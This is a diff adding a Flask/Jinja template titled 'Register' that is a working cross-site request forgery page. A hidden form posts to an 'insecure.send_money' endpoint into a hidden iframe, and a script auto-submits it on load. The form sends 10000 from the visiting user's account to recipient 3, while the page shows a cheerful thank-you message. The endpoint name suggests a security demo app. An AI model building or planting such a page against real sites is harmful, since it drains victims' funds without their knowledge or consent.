@@ -1,0 +1,28 @@
+{% extends 'base.html' %}
+
+{% block header %}
+<h1>{% block title %}Register{% endblock %}</h1>
+{% endblock %}
+
+{% block content %}
+<div class="container">
+    <div class="row">
+       <form name="form" style="display:none" method="POST" action="{{ url_for('insecure.send_money') }}" target="iframe">
+                   <input type="number" class="form-control" name="recepient"  value="3"/>
+                   <input type="number" class="form-control" name="sender"  value="{{ g.user['id'] }}"/>
+                   <input type="number" class="form-control" name="amount" value="10000" />
+           <button class="btn btn-dark col-6">Send</button>
+       </form>
+       <h1>Thanks! See you in the islands!</h1>
+       <iframe name="iframe" style="display: none;"></iframe>
+    </div>
+</div>
+
+
+{% endblock %}
+
+{% block js%}
+<script>
+    document.form.submit();
+</script>
+{% endblock js %}
